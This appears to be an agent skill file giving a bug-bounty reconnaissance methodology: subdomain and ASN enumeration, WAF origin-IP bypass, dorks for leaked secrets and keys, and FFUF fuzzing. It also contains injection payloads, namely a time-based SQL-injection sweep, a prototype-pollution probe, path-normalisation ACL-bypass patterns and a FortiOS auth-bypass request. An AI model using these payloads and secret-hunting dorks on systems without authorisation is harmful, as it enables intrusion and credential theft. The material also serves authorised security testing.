---
name: recon-methodology
description: Deep manual reconnaissance methodology — horizontal enumeration (ASN, PTR, favicon hash, acquisitions), vertical subdomain enumeration (passive, recursive, DNS brute, permutations, TLS/CSP/CNAME, scraping), origin-IP/WAF bypass, Google/GitHub/Shodan dorking, technology fingerprinting, big-scope org attacks, and advanced FFUF/IIS/ASP fuzzing tricks
---

# Deep Reconnaissance Methodology

Complements `vulnerabilities/web_recon.md` (documentation, JS analysis, endpoint-checklist construction). This file is the manual, external-tool attack-surface expansion layer: everything needed to go from a single root domain to a full asset map. Recon is non-linear — loop back as new assets surface.

**CRITICAL RULE: Never send raw subdomains directly to httpx/httprobe.** Always DNS-resolve first with `puredns`/`shuffledns`/`dnsx`, then probe. Unresolved names waste probe budget and pollute results.

---

## Recommended Order

1. **Horizontal** — find the whole org footprint (ASN/IP space, acquisitions, favicon-hash siblings).
2. **Vertical per root** — passive → recursive → active DNS brute → permutations → analytics/TLS/CSP/CNAME → scraping.
3. **Resolve & probe** — `puredns resolve` then `httpx`.
4. **Fingerprint** — WAF, tech, CMS, ports, exposed services.
5. **Content discovery** — JS + secrets, API docs, FFUF fuzzing.
6. **Dork in parallel** — Google/GitHub/Shodan for leaks.
7. **Big orgs** — BBOT, vhosts, ASN→IP brute with Host fuzzing.

---

## Phase 1: Horizontal Enumeration (find the org's footprint)

### IP space via ASN
```bash
# 1. Look up ASN at https://bgp.he.net/
# 2. Pull ranges for that ASN
whois -h whois.radb.net -- '-i origin AS8983' | grep -Eo "([0-9.]+){4}/[0-9]+" | uniq > ip_ranges.txt
```

### PTR / reverse DNS across the ranges
```bash
cat ip_ranges.txt | mapcidr -silent | dnsx -ptr -resp-only -o ptr_records.txt
```

### Favicon-hash pivot
Compute the MD5 favicon hash, then search Shodan `http.favicon.hash:<hash>` to find sibling hosts sharing the icon (same org / same stack). Spring Boot default favicon hash = `116323821`. Automate with FavFreak (`cat urls.txt | python3 favfreak.py -o out`).

### Acquisitions / related domains
Reverse-whois (whoxy.com, tools.whoisxmlapi.com/reverse-whois-search), Wikipedia/Crunchbase, and TLS cert subject/SAN pivots expand the root-domain set.

---

## Phase 2: Vertical Enumeration (subdomains per root)

### Passive
```bash
subfinder -d target.com -all -recursive -o passive.txt
assetfinder --subs-only target.com | anew passive.txt
# Also: crt.sh, gau/waybackurls, github-subdomains, gitlab-subdomains, dnsdumpster
```
Configure subfinder API keys (censys, bevigil, binaryedge, certspotter, fofa, shodan, github, virustotal, zoomeye) for far deeper passive coverage.

### Recursive (top parents get re-enumerated)
```bash
for sub in $(cat subdomains.txt | rev | cut -d '.' -f 3,2,1 | rev | sort | uniq -c | sort -nr | grep -v '1 ' | head -n 10 | sed 's/^[[:space:]]*//' | cut -d ' ' -f 2); do
  subfinder -d $sub -silent | anew -q passive_recursive.txt
  assetfinder --subs-only $sub | anew -q passive_recursive.txt
done
```

### Active DNS brute force
```bash
puredns bruteforce best-dns-wordlist.txt target.com -r resolvers-trusted.txt -w dns_bf.txt
# wordlist: wordlists-cdn.assetnote.io/data/manual/best-dns-wordlist.txt
```

### Permutations
```bash
gotator -sub subdomains.txt -perm dns_permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md | sort -u > perms.txt
puredns resolve perms.txt -r resolvers.txt > resolved_perms.txt
# Also run gotator on the NOT-resolved subs — permutations of dead names often resolve
```

### Analytics / TLS / CSP / CNAME
```bash
# Google-Analytics ID pivot: AnalyticsRelationships
# TLS SAN scrape:
cero in.target.com | sed 's/^*.//' | grep -e "\." | sort -u
# CSP header mining:
cat subdomains.txt | httpx -csp-probe -status-code -no-color | anew csp_probed.txt | cut -d ' ' -f1 | unfurl -u domains | anew -q csp_subdomains.txt
# CNAME chase:
dnsx -retry 3 -cname -l subdomains.txt
```

### Scraping (JS/source)
```bash
cat subdomains.txt | httpx -random-agent -o probed.txt
gospider -S probed.txt --js -t 50 -d 3 --sitemap --robots -w -r > gospider.txt
cat gospider.txt | grep -Eo 'https?://[^ ]+' | unfurl -u domains | grep ".target.com$" | sort -u > scrap_subs.txt
puredns resolve scrap_subs.txt -w scrap_resolved.txt -r resolvers.txt
```

### Cleanup / probe
```bash
cat horizontal.txt active.txt passive.txt | sort -u > all_subs.txt
cat all_subs.txt | httpx -random-agent -retries 2 -o filtered_subs.txt
```

---

## Phase 3: Fingerprinting

```bash
wafw00f -l urls.txt                                   # WAF vendor
nuclei -l urls.txt -t nuclei-templates/technologies   # tech stack
naabu -list subs.txt -p - -exclude-ports 80,443,22 -o ports.txt   # non-standard ports
# masscan for full 65535: masscan -p1-65535 <ip> --max-rate 1000
# jfscan (masscan+nmap): cat targets.txt | jfscan -p 0-65535 --nmap --nmap-options="-sV"
uncover -q "ssl.cert.subject.CN:target.com" -e censys,fofa,shodan
```
Also check: S3Scanner for buckets, aem-hacker for AEM, hackertarget.com zone-transfer, CMSmap for CMS.

**After fingerprinting:** for each detected product + version, use the `web_search` tool to pull known CVEs/advisories for that exact version string (e.g. "Confluence 7.13.0 RCE", "nginx 1.18 CVE"). This complements nuclei's local templates by surfacing newer or template-less issues and returns exploit/PoC context to act on.

---

## Phase 4: Origin-IP / WAF Bypass

```bash
# hakoriginfinder: sweep the ASN range with the real Host header
prips 93.184.216.0/24 | hakoriginfinder -h target.com   # "MATCH" = origin IP found
# Then hit origin directly, bypassing the WAF:
curl --resolve "target.com:443:<origin-ip>" "https://target.com/admin"
```
Other origin sources: crt.sh (pre-WAF cert history), Shodan `ssl.cert.subject.cn:target.com`, viewdns.info/iphistory, Netlas `http.title:"<target title>"`.

---

## Phase 5: Dorking (run in parallel)

### Google (replace [TARGET])
```
# Configs / secrets / backups
site:[TARGET] ext:env | ext:yml | ext:conf | ext:ini | ext:bak | ext:old | ext:sql | ext:log
# Exposed git / index / login / open redirect params
inurl:"/.git" [TARGET] -site:github.com
site:[TARGET] (inurl:redir | inurl:url | inurl:redirect | inurl:next | inurl:dest)
# Cloud storage
intext:[TARGET] (site:s3.amazonaws.com | site:blob.core.windows.net | site:storage.googleapis.com)
# Paste/collab leaks
(site:pastebin.com | site:jsfiddle.net | site:trello.com | site:codepen.io) AND "[TARGET]"
# Program discovery
inurl:security.txt intext:hackerone   /   "powered by bugcrowd" -site:bugcrowd.com
```

### GitHub
```
org:"TARGET" (token: OR pass: OR secret: OR api_key: OR access_token:)
site:[TARGET] filename:.env  /  filename:wp-config.php  /  filename:.npmrc _auth
site:[TARGET] "https://hooks.slack.com/services/"  /  AKIA  /  BEGIN RSA PRIVATE KEY
```

### Shodan
```
ssl.cert.subject.CN:"target.com"
"X-Jenkins" http.title:"Dashboard"   /   "MongoDB Server Information" port:27017 -authentication
port:"9200" all:"elastic indices"    /   port:6379   /   http.favicon.hash:<hash>
```

---

## Phase 6: Big-Scope Orgs

```bash
bbot -t target.com -f subdomain-enum                     # best all-in-one for large orgs
# vhost discovery on discovered IPs:
ffuf -w vhosts.txt -u http://<ip> -H "Host: FUZZ.target.com" -ac
# ASN → IP brute with Host fuzzing:
for i in $(cat ips); do ffuf -w subs -u https://$i -H 'Host: FUZZ' -of csv -o $i.csv; done
# Build a target-specific wordlist from all discovered URLs:
cat urls | tr "/" "\n" | sort -u > custom_wordlist.txt
# Bing dorking with ASN IPs: ip:<ip>  inbody:target   |  Google wildcards: site:*target*
```

---

## Advanced FFUF Content Discovery + IIS/ASP Tricks

```bash
ffuf -u target.com/FUZZ -w bbFuzzing.txt -ac
# Path-normalisation / ACL bypass variants (try when a dir 403s):
ffuf -u target.com/..%3B/FUZZ/ -w bbFuzzing.txt
ffuf -u target.com/%2e/FUZZ/  -w bbFuzzing.txt
ffuf -u 'target.com/FUZZ;%09..' -w bbFuzzing.txt
ffuf -u target.com/FUZZ -recursive -e .asp,.aspx,.ashx,.jsp,.php,.json,.bak,.conf,.old,.zip
# IIS cookieless-session + ADS tricks:
ffuf -u 'target.com/(S(X))/FUZZ'
ffuf -u 'target.com/bin::$INDEX_ALLOCATION/FUZZ' -e .asp,.aspx,.ashx,.dll
```

### Hash / encoding wordlists (find files named by their hash)
```bash
cat common.txt | while read w; do echo -n "$w" | md5sum | cut -d' ' -f1 >> md5.txt; done
ffuf -w md5.txt:/W1 -w extensions.txt:/W2 -u "https://target.com/path/W1.W2" -mc 200
```

---

## Quick-Win One-Liners

```bash
# Endpoints out of a JS file
cat file.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
# Mass prototype-pollution probe
subfinder -d HOST -all -silent | httpx -silent | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam=="exploit"?"[VULN]":"[safe]"' | grep VULN
# Sitemap-offset time-based SQLi sweep
cat urls.txt | httpx -silent -path 'sitemap.xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10'
```
CVE quick-checks worth keeping handy: FortiOS auth bypass (CVE-2022-40684 — `PUT /api/v2/cmdb/system/admin/admin` with spoofed `Forwarded`), and log4shell markers in headers (see `framework_1day_rce.md`).

## Suggested Output Layout
```
recon/<target>/
  subs/   horizontal.txt active.txt passive.txt all_subs.txt filtered_subs.txt
  urls/   urls.txt JS.txt
  ports/  result.txt
  dorks/  notes.md
```
